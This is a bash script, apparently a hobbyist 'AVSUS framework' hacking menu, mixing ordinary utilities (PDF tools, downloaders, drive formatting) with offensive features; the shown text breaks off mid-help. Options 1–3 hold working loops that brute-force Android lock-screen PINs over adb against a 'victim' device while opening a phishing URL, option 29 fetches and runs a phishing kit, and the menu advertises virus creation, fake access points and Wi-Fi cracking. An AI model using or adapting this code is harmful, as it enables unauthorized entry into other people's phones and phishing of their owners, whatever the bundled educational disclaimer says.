#!/bin/bash

current_directory=$(pwd)

file_destination=$(dirname $(realpath $0))
own_ip=$(hostname -I | awk '{ print $1 }')
NEW_DEVICE_PUBLIC_IP=$(curl -s https://api.ipify.org)

main_banner() {
clear
chars="/-\|"
timeout=3
start=$(date +%s)

##############################color
m="\e[0;31m"      # merah           # red
k="\e[0;33m"      # kuning          # yellow
h="\e[0;32m"      # hijau           # green
b="\e[0;34m"      # biru            # blue
lm="\e[1;31m"     # merah terang    # pink
lk="\e[1;33m"     # kuning terang   # bright yellow
lh="\e[1;32m"     # hijau terang    # light green
lb="\e[1;34m"     # langit biru     # blue sky
n="\e[0m"         # netral          # neutral
w="\e[1;37m"      # putih tebal     #thick white


###############################give Permissons,if not root user exit

    
echo -e "\033[34m
_________________________________________________________________________
|.                          .                                .           |
|		  _       ___     ______            .                    |
|		 | |     / \ \   / / ___| _   _ ___                    . |
|		/ __)   / _ \ \ / /\___ \| | | / __|                     |
|	.	\__ \  / ___ \ V /  ___) | |_| \__SERIES         .       |
|        	(   / /_/   \_\_/  |____/ \__,_|___/                     |
|  		 |_|                                                     |
|.                               |            .                     o    |
|o                       .     --o--                      .              |
|                                |                                       | \033[0m"
echo -e "\033[31m|                                                                        | 
|.                        .                          o              .    |
|                                                                        |
|                                                                        |
|       .          +-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-        o            |
|          .       |S|E|U|R|I|T|Y| | |E|D|I|T|I|O|N|            .        |
|                  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                     |
|________________________________________________________________________|
|
|
|\033[0m"
while :; do
  for (( i=0; i<${#chars}; i++ )); do
    sleep 0.1
    echo -en "\r└[+] Please wait...${chars:$i:1}" | lolcat
    now=$(date +%s)
    elapsed=$((now-start))
    if [[ $elapsed -ge $timeout ]]; then
      echo ""
      break 2 # break out of both loops
    fi
  done
done

echo -e "\033[34m
[+] DEVICE INFO:
└[+] PRIVATE IP: $own_ip
└[+] PUBLIC IP: $NEW_DEVICE_PUBLIC_IP 
\033[0m"

packages=("figlet" "wget" "adb" "nmap" "festival")

for package in "${packages[@]}"; do
    if ! command -v $package &> /dev/null; then
        echo "$package is not installed. Installing now..."
        sudo apt install $package
    fi
done



if [[ -d /data/data/com.termux ]]; then
    echo "You are using Termux. Checking for installed packages..." 
    packages=("android-tools" "nmap" "figlet" "wget")
    for package in "${packages[@]}"; do
        if ! command -v $package &> /dev/null; then
            echo "$package is not installed. Installing now..."
            pkg install $package
        fi
    done

    if ! command -v lolcat &> /dev/null; then
        echo "lolcat is not installed. Installing now..."
        pkg install ruby -y
        gem install lolcat
    fi
fi

[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo -e ${m} "└[+] PLEASE RUN IT AS ROOT${n}"; echo ;echo "PLEASE RUN IT AS ROOT" | festival --tts --pipe; exit 1; }
echo -e "${lb}
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|E|N|G|I|N|E| |<=>| |K|A|L|I|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
${n}" | lolcat
echo -e "\n\n\n"



echo -e "\033[31m
<--------------------------------------------------------------------------->
| [-] $ AVSUS FRAMEWORK                                                     |
|                                                                           |
| [+] DISCORD: https://discord.gg/M45DuEN5nH                                |
| [+] EMAIL: kanishkasingh0885@gmail.com                                    |
| [+] YOUTUBE: https://www.youtube.com/channel/UCFL-IX_rxNY_AIFdYq4QtWw     |
<--------------------------------------------------------------------------->
\033[0m"



echo -e "\n\n\n"
echo "[+] COMMANDS:" | lolcat
echo "[+] usr" | lolcat
echo "[1] 4-PIN BRUTE FORCE ATTACK" | lolcat
echo "[2] 6-PIN BRUTE FORCE ATTACK" | lolcat
echo "[3] 10-PIN BRUTE FORCE ATTACK" | lolcat
echo "[4] DOWNLOAD ADB, SNAP, NMAP, FIGLET, PYTHON3, PIP, LOLCAT" | lolcat
echo "[5] OPEN 5555 PORT OF CONNECT DEVICE" | lolcat
echo "[6] IP DETAILS" | lolcat
echo "[7] JUMP TO SCRCPY AND MONITOR ON CONNECT DEVICE" | lolcat
echo "[8] REMOVE LOCKSCREEN" | lolcat
echo "[10] INSTALL VS CODE, BLENDER, GOOGLE CHROME, MICROSOFT EDGE" | lolcat
echo "[11] INSTALL TELEGRAM,SPOTIFY" | lolcat
echo "[12] INSTALL PACKAGES" | lolcat
echo "[13] PHONEINFOS" | lolcat
echo "[14] SCAN A FILE FOR VIRUSES" | lolcat
echo "[15] SCAN A WEBSTIE FOR PHISING PAGE" | lolcat
echo "[16] FULL SCAN THIS PC" | lolcat
echo "[17] CREATE A VIRUS FOR ANDROID" | lolcat
echo "[18] CREATE A VIRUS FOR WINDOWS" | lolcat
echo "[19] MAC OS FOR KALI LINUX" | lolcat
echo "[20] SCAN ALL WIFI NEAR YOU AND CHECK ALL DEVICES CONNECTED WITH YOUR WIFI" | lolcat
echo "[21] CREATE A FAKE WIFI POINT" | lolcat
echo "[22] CRACK THE PASSWORD OF WIFICRACK THE PASSWORD OF WIFI" | lolcat
echo "[23] TEST THE WIFI INTERFACE FOR HACKING" | lolcat
echo "[24] DOWNLOAD SPOTIFY MUSIC USING URL" | lolcat
echo "[25] DOWNLOAD YOUTUBE VIDEO" | lolcat
echo "[26] SCAN BLUETOOTH NEAR YOU AND CONNECT WITH IT" | lolcat
echo "[27] DOWNLOAD GDRIVE LINKS QUICKLY" | lolcat
echo "[28] DOWNLOAD MEGA.nz LINK QUICKLY" | lolcat
echo "[29] CREATE A PHISING PAGE" | lolcat
echo "[phs] PYTHON HTTP SERVER 8080" | lolcat
echo "[tnl] CREATE A TUNNEL" | lolcat
echo "[30] WEBSITE BRUTEFORCE" | lolcat
echo "[mbrute] METASPLOIT WEBSITE BRUTE FORCE" | lolcat
echo "[31] SETUP WIFI WITH MONITOR MODE" | lolcat
echo "[raw] RESTORE WIFI ADAPTER" | lolcat
echo "[32] CAPTURE CAP FILE OF WIFI" | lolcat
echo "[33] DEAUTH THE WIFI" | lolcat
echo "[34] CREATE A DEB FILE {SHELL TO PACKAGE}" | lolcat
echo "[edf] EXTRACT .deb FILE" | lolcat
echo "[rmd] RECORDMYDESKTOP" | lolcat
echo "[fmp] FORMAT YOUR PENDRIVE" | lolcat
echo "[99] ADDITIONAL commands" | lolcat
echo "[avs] ABOUT US" | lolcat

}

show_help() {
    echo "Usage: Avstool [options]"
    echo "Options:"
echo -e "\033[31m
<--------------------------------------------------------------------------->
| [-] $ AVSUS FRAMEWORK                                                     |
|                                                                           |
| [+] DISCORD: https://discord.gg/M45DuEN5nH                                |
| [+] EMAIL: kanishkasingh0885@gmail.com                                    |
| [+] YOUTUBE: https://www.youtube.com/channel/UCFL-IX_rxNY_AIFdYq4QtWw     |
<--------------------------------------------------------------------------->

Options:
[+] usr
[1] 4-PIN BRUTE FORCE ATTACK
[2] 6-PIN BRUTE FORCE ATTACK
[3] 10-PIN BRUTE FORCE ATTACK
[4] DOWNLOAD ADB, SNAP, NMAP, FIGLET, PYTHON3, PIP, LOLCAT
[5] OPEN 5555 PORT OF CONNECT DEVICE
[6] IP DETAILS
[7] JUMP TO SCRCPY AND MONITOR ON CONNECT DEVICE
[8] REMOVE LOCKSCREEN
[10] INSTALL VS CODE, BLENDER, GOOGLE CHROME, MICROSOFT EDGE
[11] INSTALL TELEGRAM,SPOTIFY
[12] INSTALL PACKAGES
[13] PHONEINFOS
[14] SCAN A FILE FOR VIRUSES
[15] SCAN A WEBSTIE FOR PHISING PAGE
[16] FULL SCAN THIS PC
[17] CREATE A VIRUS FOR ANDROID
[18] CREATE A VIRUS FOR WINDOWS
[19] MAC OS FOR KALI LINUX
[20] SCAN ALL WIFI NEAR YOU AND CHECK ALL DEVICES CONNECTED WITH YOUR WIFI
[21] CREATE A FAKE WIFI POINT
[22] CRACK THE PASSWORD OF WIFICRACK THE PASSWORD OF WIFI
[23] TEST THE WIFI INTERFACE FOR HACKING
[24] DOWNLOAD SPOTIFY MUSIC USING URL
[25] DOWNLOAD YOUTUBE VIDEO
[26] SCAN BLUETOOTH NEAR YOU AND CONNECT WITH IT
[27] DOWNLOAD GDRIVE LINKS QUICKLY
[28] DOWNLOAD MEGA.nz LINK QUICKLY
[29] CREATE A PHISING PAGE
[tnl] CREATE A TUNNEL
[30] WEBSITE BRUTEFORCE
[mbrute] METASPLOIT WEBSITE BRUTE FORCE
[31] SETUP WIFI WITH MONITOR MODE
[raw] RESTORE WIFI ADAPTER
[32] CAPTURE CAP FILE OF WIFI
[33] DEAUTH THE WIFI
[34] CREATE A DEB FILE {SHELL TO PACKAGE}
[avs q] quiet mode, direcly on work.
[g] GRAPHICAL
[edf] EXTRACT .deb FILE
[phs] PYTHON HTTP SERVER 8080
[h] help
[rmd] RECORDMYDESKTOP
[fmp] FORMAT YOUR PENDRIVE
[cpdf] COMPRESS PDF
[pdfpass] SET THE PASSWORD ON PDF
[itp] IMAGE TO PDF
[avs] ABOUT US
[99] HELP
\033[0m"
}

add_commands() {

echo -e "\033[34m

[+] 'install chrome' TO INSTALL GOOGLE CHROME
[+] 'install edge' TO INSTALL MICROSOFT EDGE
[+] 'install virtual box' TO INSTALL VIRTUAL BOX
[+] 'install spotify' TO INSTALL SPOTIFY

\033[0m"

}

# Parse the command line options
while getopts "h" opt; do
    case $opt in
        h)
            clear
            show_help
            exit 0
            ;;
        \?)
            show_help
            exit 1
            ;;
    esac
done

# Parse the command line options
if [[ $1 == "q" ]]; then
    echo ""
    else
        main_banner
fi

echo -e "\n\n\n"

# Function to play music on YouTube
play_music() {
    query=${1#*"play"}
    search_query=$(echo $query | sed 's/ /+/g')
    url="https://www.youtube.com/results?search_query=$search_query"
    google-chrome-stable $url
}


install_android_studio() {

    echo "[+] INSTALLING ANDROID STUDIO..."
    wget https://redirector.gvt1.com/edgedl/android/studio/ide-zips/2022.2.1.20/android-studio-2022.2.1.20-linux.tar.gz
    echo "[+] EXTRACTING THE PACKAGE..."
    tar -xvzf android-studio-2020.3.1.0-linux.tar.gz
    echo "[+] MOVING EXTRACTED FILE TO /opt/"
    sudo mv android-studio /opt/
    echo "[+] INSTALLING JAVA DEVLOPMENT KIT"
    sudo apt-get install openjdk-11-jdk
    echo "[+] SETTING UP THE ENVIRONMENT VARIABLES..."
    echo 'export PATH=$PATH:/opt/android-studio/bin' >> ~/.bashrc
    source ~/.bashrc

    echo "[+] LAUNCHING THE STUDIO..."
    studio.sh

}

set_pdf_password() {
    read -p "[+] WHAT WILL BE THE PASSWORD OF PDF: " password
    qpdf --encrypt "$password" "$password" 256 -- "$destination" "${destination%.pdf}_protected.pdf"
}

remove_pdf_password() {
    qpdf --decrypt -- "$destination" "${destination%.pdf}_unprotected.pdf"
}

validate_number_of_images() {
    while true; do
        read -p "[+] NUMBERS OF IMAGE [MAX 10]: " num_images
        if [[ "$num_images" =~ ^[1-9]$|^10$ ]]; then
            break
        else
            echo "Invalid input. Please enter a number between 1 and 10."
        fi
    done
}

convert_to_pdf() {
    read -p "[+] SAVED PDF: " output_pdf

    # Validate the output PDF filename
    if [ -z "$output_pdf" ]; then
        output_pdf="AVSPDF.pdf"
    elif [[ "$output_pdf" != *.pdf ]]; then
        output_pdf="${output_pdf}.pdf"
    fi

    # Convert images to PDF
    images=""
    for ((i=1; i<=$num_images; i++)); do
        read -p "[+] IMAGE $i: " image_path
        images+=" $image_path"
    done

    convert $images $output_pdf

    echo "Images converted to PDF. PDF saved as: $output_pdf"
}



validate_destination() {
    while true; do

        if ! command -v qpdf &>/dev/null; then
        echo "qpdf not found. Installing qpdf..."
        sudo apt-get update
        sudo apt-get install -y qpdf
        fi
        read -p "[+] ENTER DESTINATION OF PDF: " destination
        if [ -z "$destination" ]; then
            echo "Please provide a valid destination."
        elif [ -f "$destination" ]; then
            break
        else
            echo "File not found. Please provide a valid path."
        fi
    done
}

# Function to validate the compression size in KB
validate_compression_size() {
    while true; do
        read -p "[+] COMPRESSION SIZE [IN KB]: " size_kb
        if [[ "$size_kb" =~ ^[0-9]+$ ]]; then
            break
        else
            echo "Invalid input. Please enter a numeric value."
        fi
    done
}

format_drive() {

    echo "└[+] LIST OF CONNECTED DRIVES:"
    lsblk -o NAME,LABEL,MOUNTPOINT | grep -o 'sd[b-z][0-9]'
    echo "└[+] SELECT YOUR DRIVE:"
    read pendrive
    echo "└[+] SELECT FORMAT (ntfs, fat32, ext4):"
    read format
    sudo umount /dev/$pendrive
    if [ $format == "ntfs" ]
    then
        sudo mkfs.ntfs /dev/$pendrive
    elif [ $format == "fat32" ]
    then
        sudo mkfs.vfat /dev/$pendrive
    elif [ $format == "ext4" ]
    then
        sudo mkfs.ext4 /dev/$pendrive
    else
        echo "Invalid format"
    fi
    echo "Pendrive formatted to $format"
}

# Function to process user input and provide responses
process_input() {
    user_input=$1
    case "$user_input" in
        "play "*)
            echo "Type: $user_input" | lolcat
            play_music "[+] PLAYING $user_input"
            ;;
        "hello" | "hi")
            echo "Hello! How can I assist you today?"
            ;; # more
        "what is your name" | "who are you")
            echo "I am your advanced virtual assistant. How can I help you?"
            ;;
        "what is the time" | "what's the time")
            current_time=$(date +"%T")
            echo "The current time is $current_time."
            ;;
        "tell me a fun fact")
            echo "Did you know that honey never spoils? Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3,000 years old and still perfectly edible!"
            ;;
        "what's the weather like today" | "tell me the weather")
            echo "I'm sorry, I don't have access to real-time weather information. However, you can check a reliable weather website or use a weather app on your device for accurate weather updates."
            ;;
        "who won the last Super Bowl" | "who won the Super Bowl")
            echo "I'm sorry, my knowledge is cut off in 2021, and I don't have information about the most recent Super Bowl. You can search online or check the latest news for the winner."
            ;;
        "what you can do for me")
        echo "[+] I AM A SHELL BASED ASSISTANT FOR LINUX"
        echo "[+] I CAN CRACK 4,6 AND 10 PIN LOCK"
        echo "[+] I CAN SHOW IP OF CONNECTED DEVICE"
        echo "[+] I CAN PLAY MUSIC"
        echo "[+] I CAN TALK"
        ;;
        "can you speak")
        echo "[+]NO, I CAN'T SPEAK OR TALK, AS I AM A TEXT BASED ASSISTANT I CAN'T SPEAK"
        echo "[+] BUT MY ELDER BROTHER , ANT HE CAN TALK , AND GIVE YOU MORE INFORMATION"
        ;;
        "is ant your brother" | "is Ant your elder brother" | "is ant your brother" | "is Ant your brother")
        echo "Yes Ant is my elder brother he was created by python on Good friday 2023"
        ;;
        h)
        show_help
        ;;
        1)
            echo "└[+] STARTING 4-PIN BRUTE FORCE" | lolcat
            connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
            own_ip=$(hostname -I | awk '{ print $1 }')
            echo "Victem's ip: $connected_device_ip" | lolcat
            echo "Your IP: $own_ip" | lolcat
	    echo "[-] IF DEVICE IS UNAUTHORIZED THEN CLICK ALLOW ON DEVICE TO PROCEED" | lolcat
            echo "[ • ] ENTER URL OF YOUR PHISING PAGE IF YOU HAVE, IF YOU DON'T HAVE ANY THEN JUST CLICK ENTER. " | lolcat
            echo -n "Your web: " | lolcat
            read website

            echo "[ • ] STARTING PIN BRUTE FORCE ATTACK..." | lolcat
            for i in $(seq 1 9999)
            do
                adb shell input text $(printf "%04d" $i)
                adb shell input keyevent 66
                adb shell am start -a android.intent.action.VIEW -d "$website"
                if [ $((i % 5)) -eq 0 ]
                then
                    echo "[ • ] WAITING FOR 30 SECONDS"
                    sleep 30
                fi
            done
            ;;
        24)
	read -p "└[+] Enter the Spotify music URL: " spotify_url

	# Installing spotdl (if not already installed)
	command -v spotdl >/dev/null 2>&1 || {
	    echo "spotdl is not installed. Installing..."
	    pip install spotdl
	}

	# Downloading the Spotify music
	spotdl "$spotify_url"

	echo "Download complete!"
        ;;
        25)
	echo "Enter the URL of the YouTube video you want to download:"
	read url
	echo "Enter the resolution you want to download (480p, 720p, 1080p, 1440p, 2160p) or type 'audio' to download only the audio:"
	read res

	if [ "$res" == "audio" ]; then
	    youtube-dl -f bestaudio $url
	else
	    youtube-dl -f 'bestvideo[height<=?'$res']+bestaudio/best[height<=?'$res']' $url
	fi
        ;;
        "phs")
        python3 -m http.server 8080
        ;;
        26)
	if ! command -v bluetoothctl &> /dev/null
	then
	    echo "└[+] INSTALLING BLUETOOTH"
	    sudo apt-get update
	    sudo apt-get install -y bluetooth
	fi

	# Scan for nearby Bluetooth devices
	echo "Scanning for nearby Bluetooth devices..."
	bluetoothctl scan on
	sleep 5
	bluetoothctl scan off

	# List available devices
	echo "Available devices:"
	bluetoothctl devices

	# Prompt user to connect to a device
	read -p "[+] Enter the MAC address of the device you want to connect to: " mac_address
	bluetoothctl connect $mac_address
        ;;
        avs)
echo -e "\e[92m


[+] DISCLAIMER: PLEASE READ CAREFULLY

[+] ENGLISH DISCLAIMER:

THIS HACKING TOOL IS INTENDED FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY. BY CHOOSING TO USE THIS TOOL, YOU AGREE TO ABIDE BY THE FOLLOWING TERMS AND CONDITIONS:

[+] 1. EDUCATIONAL PURPOSE ONLY: THIS TOOL IS DESIGNED SOLELY FOR EDUCATIONAL AND ETHICAL PURPOSES, TO HELP USERS UNDERSTAND AND STRENGTHEN CYBERSECURITY. IT IS NOT INTENDED FOR ANY MALICIOUS OR ILLEGAL ACTIVITIES.

[+] 2. LEGAL COMPLIANCE: HACKING, IN ANY FORM, IS ILLEGAL IN MANY JURISDICTIONS AND MAY CARRY SEVERE PENALTIES. IT IS YOUR RESPONSIBILITY TO ENSURE THAT YOU ARE IN FULL COMPLIANCE WITH ALL APPLICABLE LAWS AND REGULATIONS IN YOUR COUNTRY OR JURISDICTION. IF YOU CHOOSE TO USE THIS TOOL FOR ILLEGAL ACTIVITIES, YOU DO SO AT YOUR OWN RISK.

[+] 3. NO LIABILITY: THE CREATORS AND DISTRIBUTORS OF THIS TOOL ARE NOT RESPONSIBLE FOR ANY ACTIONS TAKEN BY USERS OF THIS TOOL. YOU ARE SOLELY RESPONSIBLE FOR YOUR ACTIONS, AND ANY CONSEQUENCES THAT MAY ARISE AS A RESULT OF USING THIS TOOL.

[+] 4. RESTRICTED USAGE: THIS TOOL SHOULD NOT BE USED IN ANY MILITARY, SECRET SERVICE, OR GOVERNMENT ORGANIZATIONS, OR FOR ANY ACTIVITIES THAT MAY CAUSE HARM, DAMAGE, OR DISRUPTION TO INDIVIDUALS, ORGANIZATIONS, OR SYSTEMS. UNAUTHORIZED ACCESS TO COMPUTER SYSTEMS OR NETWORKS IS STRICTLY PROHIBITED.

[+] 5. ETHICAL USE: WE STRONGLY ENCOURAGE USERS TO APPLY THE KNOWLEDGE GAINED FROM THIS TOOL IN AN ETHICAL AND RESPONSIBLE MANNER. USE IT TO ENHANCE YOUR CYBERSECURITY SKILLS AND TO PROTECT SYSTEMS AND NETWORKS, RATHER THAN EXPLOITING VULNERABILITIES FOR PERSONAL GAIN.

BY USING THIS TOOL, YOU ACKNOWLEDGE THAT YOU HAVE READ AND UNDERSTOOD THIS DISCLAIMER AND AGREE TO COMPLY WITH ALL APPLICABLE LAWS AND ETHICAL STANDARDS. FAILURE TO DO SO MAY RESULT IN LEGAL CONSEQUENCES. IF YOU DO NOT AGREE WITH THESE TERMS, DO NOT USE THIS TOOL.



[ + ] ABOUT ME:
Hey there, I'm  R  O  N { LET'S KEEP MY REAL NAME A SECRET }, a 13-year-old from India, and I'm really passionate about ethical hacking and gaming.
You know, I've been exploring the fascinating world of ethical hacking, and it's been an incredible journey so far.

One of the coolest things I've done is create a hacking tool that simplifies some aspects of hacking.
Now, before you jump to conclusions, let me clarify something important: I believe in responsible hacking.
My tool is designed to assist and educate, not to encourage any malicious activities. It's like a learning aid for budding ethical hackers.

My dream is to make ethical hacking more accessible in India. I want everyone to have the opportunity to learn about this field, but with the emphasis on ethics and responsibility. Hacking shouldn't be about causing harm or chaos; it should be a skill used for good.

So, my mission is to empower individuals with knowledge and skills so that they don't have to rely solely on tools. Hacking, at its core, is about understanding systems, identifying vulnerabilities, and finding solutions. My tool is just a stepping stone to help people grasp these concepts and develop the skills they need.

I truly believe that with the right guidance and a strong ethical foundation, we can create a community of responsible hackers in India who use their skills to enhance cybersecurity and protect against threats. After all, knowledge is power, and with great power comes great responsibility.

J A I   H I N D 🙏
\e[0m"


        ;;
        27)
	# Function to check if a command is installed
	command_exists() {
	    command -v "$1" >/dev/null 2>&1
	}

	# Check if pip is installed
	if ! command_exists pip; then
	    echo "pip is not found. Installing pip..."
	    sudo apt-get update
	    sudo apt-get install -y python3-pip
	fi

	# Check if gdown is installed
	if ! command_exists gdown; then
	    echo "gdown is not found. Installing gdown..."
	    pip install gdown
	fi

	# Prompt for gdrive link input
	read -p "[+] Enter the Google Drive link: " gdrive_link

	# Download the file
	gdown "$gdrive_link"
        ;;
        "g")
        main_banner
        ;;
        "graphics")
        main_banner
        ;;
        "install android studio")
        install_android_studio
        ;;
        28)
	if ! command -v megadl &>/dev/null; then
	    echo "megatools is not found. Installing megatools..."
	    sudo apt-get update
	    sudo apt-get install -y megatools
	fi

	# Prompt for MEGA.nz link input
	read -p "[+] Enter the MEGA.nz link: " mega_link

	# Download the file
	megadl "$mega_link"
        ;;
        "fmp")
        format_drive
        ;;
        29)
        if [ ! -d "zphisher" ]; then
        echo "[+] COMMAND ==> git clone https://github.com/htr-tech/zphisher "
        git clone https://github.com/htr-tech/zphisher
        fi
        cd zphisher
        chmod +x *
        ./zphisher.sh
        ;;
        "tnl")
        if ! command -v ssh &> /dev/null; then
            echo "ssh is not installed. Installing now..."
            echo "[+] COMMAND ==> sudo apt install ssh"
            sudo apt install ssh
        fi
        echo "[+] COMMAND ==> ssh -R 80:localhost:8080 nokey@localhost.run "
        ssh -R 80:localhost:8080 nokey@localhost.run
        ;;
        2)
            echo "[+] STARTING 6-PIN BRUTE FORCE ATTACK"
            connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
            own_ip=$(hostname -I | awk '{ print $1 }')
            echo "Victem's ip: $connected_device_ip" | lolcat
            echo "Your IP: $own_ip" | lolcat

            echo "[ • ] ENTER URL OF YOUR PHISING PAGE IF YOU HAVE, IF YOU DON'T HAVE ANY THEN JUST CLICK ENTER. "
            echo -n "Your web: "
            read website

            echo "[ • ] STARTING PIN BRUTE FORCE ATTACK..." | lolcat
            for i in $(seq 1 999999)
            do
                adb shell input text $(printf "%06d" $i)
                adb shell input keyevent 66
                adb shell am start -a android.intent.action.VIEW -d "$website"
                if [ $((i % 5)) -eq 0 ]
                then
                    echo "[ • ] WAITING FOR 30 SECONDS"
                    sleep 30
                fi
            done
        ;;
        "raw")
        default_interfacemn="wlan0"
        interfacemn=${interface:-$default_interface}
        read -p "[+] Enter the interface (wlan0 or wlan1, default: $default_interfacemn): " interfacemn
        echo "[+] COMMAND ==> airmon-ng start $interfacemn"
        echo "[+] COMMAND ==> airmon-ng stop $interfacemn"
        echo "[+] COMMAND ==> service NetworkManager restart"
        airmon-ng start $interfacemn
        airmon-ng stop $interfacemn
        service NetworkManager restart
        ;;
        3)
            echo "[+] STARTING 10-PIN BRUTE FORCE ATTACK"
            echo "└[+] STARTING PIN BRUTE FORCE"
            connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
            own_ip=$(hostname -I | awk '{ print $1 }')
            echo "Victem's ip: $connected_device_ip" | lolcat
            echo "Your IP: $own_ip" | lolcat

            echo "[ • ] ENTER URL OF YOUR PHISING PAGE IF YOU HAVE, IF YOU DON'T HAVE ANY THEN JUST CLICK ENTER. " | lolcat
            echo -n "Your web: " | lolcat
            read website

            echo "[ • ] STARTING PIN BRUTE FORCE ATTACK..." | lolcat
            for i in $(seq 1 9999999999)
            do
                adb shell input text $(printf "%010d" $i)
                adb shell input keyevent 66
                adb shell am start -a android.intent.action.VIEW -d "$website"
                if [ $((i % 5)) -eq 0 ]
                then
                    echo "[ • ] WAITING FOR 30 SECONDS" | lolcat
                    sleep 30
                fi
            done
        ;;
        34)
        read -p "[+] Enter the name of your package:" package_name
        echo "[+] PACKAGE NAME ==> $package_name"
        read -p "[+] Enter the version of your package:" package_version
        echo "[+] PACKAGE VERSION ==> $package_version"
        read -p "[+] Enter the path to your shell script:" script_path
        echo "[+] PACKAGE DESTINATION ==> $script_path"
        echo "[+] COMMAND ==> dpkg-deb --build $package_name "

        # Create the package directory structure
        package_dir="${package_name}_${package_version}"
        mkdir -p "$package_dir/DEBIAN"
        mkdir -p "$package_dir/usr/bin"

        # Create the control file
        control_file="$package_dir/DEBIAN/control"
        echo "Package: $package_name" > $control_file
        echo "Version: $package_version" >> $control_file
        echo "Section: base" >> $control_file
        echo "Priority: optional" >> $control_file
        echo "Architecture: all" >> $control_file
        echo "Maintainer: Your Name <your.email@example.com>" >> $control_file
        echo "Description: Your package description" >> $control_file

        # Copy the script to the package directory
        cp "$script_path" "$package_dir/usr/bin/$package_name"
        chmod 755 "$package_dir/usr/bin/$package_name"

        # Build the package
        dpkg-deb --build "$package_dir"
        echo "[+] FILE CREATED WITH NAME: $package_dir "
        ;;
        "cd ..")
        dir=$(pwd)
        cd ..
        echo "[+] CHANGING DIRECTORY... TO $dir"
        ;;
        "nikto")
        echo -e "\033[31m
        [+] ABOUT ==> Nikto is a popular open-source web server scanner used for finding potential vulnerabilities and security issues in web servers and web applications. It's a valuable tool for penetration testers,
        security analysts, and system administrators to identify and mitigate web server and application security risks. Nikto works well in Kali Linux, which is a popular penetration 
        testing and security-focused Linux distribution.
        
        [+] EXAMPLE ==> Common Options:
        -h: Specifies the target host.
        -p: Specifies the port to scan (default is 80).
        -ssl: Enable SSL scanning (e.g., -ssl 443 for HTTPS).
        -output <filename>: Save the scan results to a file.
        -Format <format>: Specify the output format (e.g., html, csv, xml, txt).
        -id <custom_id>: Set a custom scan identifier.
        -Tuning <options>: Use this option to enable/disable specific tests (e.g., -Tuning 123456).
        
        Example Scans:
        Basic scan on a web server: nikto -h http://example.com
        Scan an SSL-enabled server: nikto -h https://example.com
        Save results to a file: nikto -h http://example.com -output /path/to/outputfile.html
        Specify output format: nikto -h http://example.com -output /path/to/outputfile.txt -Format txt
        \033[0m"
        ;;
        "ike-scan")
        echo -e "\033[31m
[+] DETAILS ==>ike-scan is a command-line tool used for discovering, fingerprinting, and testing the security of Internet Key Exchange (IKE) VPN servers. It's a valuable tool for network and security professionals to assess the security of VPN implementations.

[+] Common Options:

-A or --aggressive: Perform an aggressive scan, which includes sending more IKE requests.
-M or --mca: Specify the authentication methods to test (e.g., -M 3,5,6).
-P or --p1-probe: Probe for Phase 1 modes and policies.
-Pn or --nodns: Disable DNS resolution.
-o <filename>: Save the scan results to a file.
-i <interface>: Specify the network interface to use for the scan.
Example Scans:

Basic scan: ike-scan 192.168.1.1
Aggressive scan with specific authentication methods: ike-scan -A -M 3,5,6 192.168.1.1
Probe for Phase 1 modes and policies: ike-scan -P 192.168.1.1
Save results to a file: ike-scan 192.168.1.1 -o /path/to/outputfile.txt
Interpreting Results:
ike-scan will send IKE packets to the target and attempt to identify the IKE version and supported authentication methods. It will provide information about the remote VPN server's configuration and supported security features. Analyze the results to understand the security posture of the VPN server.

Additional Configuration:
ike-scan allows you to customize the scan further by specifying various authentication methods and modes. You can explore these options in the ike-scan documentation and adjust them based on your specific requirements.
        \033[0m"
        ;;
        edf)
        read -p "[+] ENTER YOUR FILE DESTINATION:" file_des
        dpkg -i $file_des
        ;;
        cd)
        read -p "└[+] ENTER THE DIRECTORY:" dir_new
        cd $dir_new
        echo "└[+] CHANGING DIRECTORY..."
        
        ;;
        "rmd")
        read -p "[+] NAME OF FILE: " filename
        echo "[+] FILENAME ==> $filename"

        read -p "[+] NAME OF CONVERTED FILE: " converted_filename
        echo "[+] CONVERTED FILENAME ==> $converted_filename"

        # Get screen resolution
        resolution=$(xdpyinfo | awk '/dimensions/{print $2}')
        width=$(echo "$resolution" | awk -Fx '{print $1}')
        height=$(echo "$resolution" | awk -Fx '{print $2}')
        echo "[+] RESOLUTION ==> $resolution"
        echo "[+] WIDTH ==> $width"
        echo "[+] HEIGHT ==> $height"

        # Record desktop using recordmydesktop with --no-sound option
        recordmydesktop --no-sound --full-shots --width "$width" --height "$height" -o "$filename.ogv"

        # Convert recorded file using ffmpeg
        ffmpeg -i "$filename.ogv" -c:v libx264 -preset veryslow -crf 22 "$converted_filename.mp4"
        read -p "[+] DO YOU WANT TO KEEP $filename.ogv OR NO {yes keep it / No  Delete it} [Y/N]: " keep_file
        if [[ $keep_file == "N" || $keep_file == "n" ]]; then
            rm -rf "$filename.ogv"
            echo "[+] $filename.ogv deleted."
        else
            echo "[+] $filename.ogv kept."
        fi
        ;;
        "hydra")
        echo -e "\033[31m
        [+] BAIC ==> Hydra is a powerful and versatile password-cracking tool used to perform brute-force and dictionary attacks against various network protocols and services.
        It is commonly used by penetration testers and security professionals to test the strength of passwords and to identify weak credentials that may be vulnerable to unauthorized access.
        Here's an overview of Hydra and its usage:
        [+] ADVANCE
	● The basic syntax for running Hydra is as follows:
	hydra [options] <target> <protocol> [service-specific options]
	● [options]: Various options to customize the attack, such as specifying usernames, passwords, and output files.
	● <target>: The target system's IP address or hostname.
	● <protocol>: The protocol or service you want to attack (e.g., SSH, FTP, HTTP).
	[service-specific options]: Options specific to the chosen protocol or service.
	hydra -l admin -P password-file.txt ssh://192.168.1.1
	Common Options:

	-l: Specify a single username or a file containing a list of usernames.
	-L: Specify a username list file.
	-p: Specify a single password or a file containing a list of passwords.
	-P: Specify a password list file.
	-o: Specify an output file to save the results.
	-t: Set the number of parallel tasks or threads to use.
	-vV: Enable verbose mode and display more information.
	-f: Exit once a valid username/password pair is found.
	Protocols and Services:
	Hydra supports a wide range of protocols and services, including SSH, FTP, Telnet, HTTP(S), RDP, MySQL, PostgreSQL, and more.
	You need to specify the appropriate protocol and service-specific options when using Hydra.

	Advanced Options:

